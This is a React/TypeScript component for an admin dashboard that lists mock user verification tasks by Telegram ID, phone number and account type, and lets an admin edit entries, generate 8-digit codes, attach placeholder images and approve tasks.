import React, { useState, useEffect } from 'react';
import { useAppConfig } from '../context/AppContext';
import { MockDatabase, UserTask } from '../lib/mockDatabase';
import { User, Phone, Globe, Hash, Clock, Check, Edit2, Image as ImageIcon, MessageSquare } from 'lucide-react';

export default function AdminDashboard() {
  const [tasks, setTasks] = useState<UserTask[]>([]);
  const [editingId, setEditingId] = useState<string | null>(null);

  // Auto-refresh tasks based on storage events (for multi-tab testing)
  useEffect(() => {
    const fetchTasks = () => {
      setTasks(MockDatabase.getTasks().sort((a, b) => b.createdAt - a.createdAt));
    };

    fetchTasks();
    const interval = setInterval(fetchTasks, 2000);
    window.addEventListener('storage', fetchTasks);
    return () => {
      window.removeEventListener('storage', fetchTasks);
      clearInterval(interval);
    };
  }, []);

  const handleSendCode = (telegramId: string) => {
    const code = Math.floor(10000000 + Math.random() * 90000000).toString(); // 8 digits
    MockDatabase.updateTask(telegramId, { code });
  };

  const handleSendImage = (telegramId: string) => {
    // Generate a random placeholder image
    const randomId = Math.floor(Math.random() * 1000);
    const imageUrl = `https://picsum.photos/seed/${randomId}/600/400`;
    MockDatabase.updateTask(telegramId, { imageUrl });
  };

  const handleSendSuccess = (telegramId: string) => {
    MockDatabase.updateTask(telegramId, { 
      status: 'success', 
      successMessage: 'Admin has verified your submission.' 
    });
  };

  const handleCustomCode = (telegramId: string, code: string) => {
    MockDatabase.updateTask(telegramId, { code });
  };

  return (
    <div className="p-4 md:p-8 max-w-5xl mx-auto space-y-6">
      <div className="flex justify-between items-end mb-8">
        <div>
          <h2 className="text-2xl font-bold text-slate-800">Admin Dashboard</h2>
          <p className="text-sm text-slate-500">Manage incoming user verification tasks</p>
        </div>
        <div className="flex gap-2">
          <button className="px-4 py-2 bg-white border border-slate-200 rounded-lg text-sm font-semibold text-slate-600 hover:bg-slate-50">Export Data</button>
          <button className="px-4 py-2 bg-sky-600 rounded-lg text-sm font-semibold text-white">System Logs</button>
        </div>
      </div>

      {tasks.length === 0 ? (
        <div className="text-center bg-white rounded-2xl py-12 border border-slate-200 shadow-sm">
          <Clock className="w-10 h-10 text-slate-300 mx-auto mb-3" />
          <h3 className="text-lg font-medium text-slate-800">No pending tasks</h3>
          <p className="text-slate-500 mt-1 text-sm">When users submit forms, they will appear here.</p>
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          {tasks.map(task => (
            <div key={task.id} className="bg-white rounded-2xl border border-slate-200 shadow-sm overflow-hidden flex flex-col transition-shadow hover:shadow-md">
              <div className="p-4 border-b border-slate-100 flex justify-between items-center bg-slate-50">
                <div className="flex items-center space-x-3">
                  <div className="w-8 h-8 rounded-full bg-indigo-100 flex items-center justify-center">
                    <User className="w-4 h-4 text-indigo-600" />
                  </div>
                  <div>
                    <span className="font-mono text-xs font-bold text-slate-700 bg-slate-200 px-2 py-0.5 rounded">
                      ID: {task.telegramId}
                    </span>
                  </div>
                </div>
                <StatusBadge status={task.status} />
              </div>

              <div className="p-4 space-y-3 flex-grow">
                {editingId === task.id ? (
                  <div className="space-y-3">
                    <input 
                      type="text" 
                      defaultValue={task.phone}
                      id={`edit-phone-${task.id}`}
                      className="w-full bg-white border border-slate-200 rounded-lg px-3 py-2 text-sm focus:ring-1 focus:ring-sky-500 outline-none"
                    />
                    <select 
                      defaultValue={task.accountType} 
                      id={`edit-type-${task.id}`}
                      className="w-full bg-white border border-slate-200 rounded-lg px-3 py-2 text-sm focus:ring-1 focus:ring-sky-500 outline-none"
                    >
                      <option value="Personal">Personal</option>
                      <option value="Business">Business</option>
                    </select>
                    <div className="flex gap-2">
                      <button 
                        onClick={() => {
                          const phone = (document.getElementById(`edit-phone-${task.id}`) as HTMLInputElement).value;
                          const accountType = (document.getElementById(`edit-type-${task.id}`) as HTMLSelectElement).value as any;
                          MockDatabase.updateTask(task.telegramId, { phone, accountType });
                          setEditingId(null);
                        }}
                        className="bg-sky-600 hover:bg-sky-700 text-white px-4 py-2 rounded-lg text-xs font-bold flex-1"
                      >
                        Save
                      </button>
                      <button 
                        onClick={() => setEditingId(null)}
                        className="bg-slate-100 hover:bg-slate-200 text-slate-600 px-4 py-2 rounded-lg text-xs font-bold"
                      >
                        Cancel
                      </button>
                    </div>
                  </div>
                ) : (
                  <>
                    <div className="flex items-start">
                      <Phone className="w-4 h-4 text-slate-400 mt-0.5 mr-2 flex-shrink-0" />
                      <div>
                        <div className="text-sm font-bold text-slate-800">{task.phone}</div>
                        <div className="text-xs text-slate-500 flex items-center mt-0.5">
                          <Globe className="w-3 h-3 mr-1" /> {task.country || 'Unknown'}
                        </div>
                      </div>
                    </div>

                    <div className="flex items-center space-x-2 mt-4 pt-4 border-t border-slate-100">
                      <span className={`px-2 py-1 rounded text-[10px] font-bold uppercase tracking-wide ${task.accountType === 'Business' ? 'bg-amber-50 text-amber-600' : 'bg-slate-100 text-slate-600'}`}>
                        {task.accountType}
                      </span>
                      <span className="text-xs text-slate-400 font-medium italic hidden md:inline">
                        {new Date(task.createdAt).toLocaleTimeString()}
                      </span>
                      <button
                        onClick={() => setEditingId(task.id)}
                        className="ml-auto text-xs text-sky-600 hover:text-sky-800 font-bold flex items-center px-2 py-1 bg-sky-50 rounded"
                      >
                        <Edit2 className="w-3 h-3 mr-1" /> Edit
                      </button>
                    </div>
                  </>
                )}
              </div>

              {/* Admin Actions Panel */}
              <div className="mt-auto p-4 bg-slate-50 border-t border-slate-200">
                <div className="flex flex-col gap-3">
                  <div className="flex flex-col gap-1">
                    <label className="text-[10px] uppercase font-bold text-slate-400">Manage Access</label>
                    <div className="flex gap-2">
                      <input 
                        type="text" 
                        placeholder="8-digit code" 
                        className="flex-1 bg-white border border-slate-200 rounded-lg px-3 py-1.5 text-sm font-mono tracking-widest text-sky-600 focus:ring-1 focus:ring-sky-500 outline-none"
                        value={task.code || ''}
                        onChange={(e) => handleCustomCode(task.telegramId, e.target.value)}
                      />
                      <button 
                        onClick={() => handleSendCode(task.telegramId)}
                        className="px-3 py-1.5 bg-sky-50 text-sky-600 rounded-md text-xs font-bold hover:bg-sky-100"
                        title="Generate Random Code"
                      >
                        Generate
                      </button>
                    </div>
                  </div>

                  <div className="flex gap-2">
                    <button 
                      onClick={() => handleSendImage(task.telegramId)}
                      className={`flex-1 flex items-center justify-center space-x-1 py-1.5 rounded-lg text-xs font-bold transition-colors ${task.imageUrl ? 'bg-slate-100 text-slate-600' : 'bg-white border border-slate-200 text-slate-500 hover:bg-slate-50'}`}
                    >
                      <ImageIcon className="w-3.5 h-3.5" />
                      <span>{task.imageUrl ? 'Image Added' : 'Attachment'}</span>
                    </button>

                    <button 
                      onClick={() => handleSendSuccess(task.telegramId)}
                      disabled={task.status === 'success'}
                      className={`flex-1 flex items-center justify-center space-x-1 py-1.5 rounded-lg text-xs font-bold transition-colors shadow-sm ${task.status === 'success' ? 'bg-green-50 text-green-600 opacity-50 cursor-not-allowed' : 'bg-green-600 hover:bg-green-500 text-white'}`}
                    >
                      <Check className="w-3.5 h-3.5" />
                      <span>Approve</span>
                    </button>
                  </div>
                </div>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

function StatusBadge({ status }: { status: string }) {
  if (status === 'waiting') {
    return (
      <div className="flex items-center gap-2">
        <div className="w-2 h-2 rounded-full bg-amber-400 animate-pulse"></div>
        <span className="text-sm font-medium text-slate-600">Waiting...</span>
      </div>
    );
  }
  if (status === 'success') {
    return (
      <div className="flex items-center gap-2">
        <div className="w-2 h-2 rounded-full bg-green-500"></div>
        <span className="text-sm font-medium text-slate-600">Success</span>
      </div>
    );
  }
  return (
    <div className="flex items-center gap-2">
      <div className="w-2 h-2 rounded-full bg-slate-300"></div>
      <span className="text-sm font-medium text-slate-600 capitalize">{status}</span>
    </div>
  );
}
